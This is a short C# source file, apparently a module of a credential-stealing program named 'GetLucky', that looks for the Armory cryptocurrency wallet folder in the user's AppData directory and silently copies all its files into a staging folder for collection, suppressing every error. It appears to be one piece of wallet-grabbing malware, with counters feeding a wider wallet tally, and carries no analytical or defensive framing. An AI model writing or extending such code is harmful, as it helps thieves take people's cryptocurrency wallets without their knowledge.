using System.IO;

namespace GetLucky
{
    class Armory
    {
        public static int count = 0;
        public static void ArmoryStr(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(Help.AppDate + "\\Armory\\"))
                {
                    foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\Armory\\");
                        file.CopyTo(directorypath + "\\Wallets\\Armory\\" + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }



            }
            catch { }

        }
    }
}
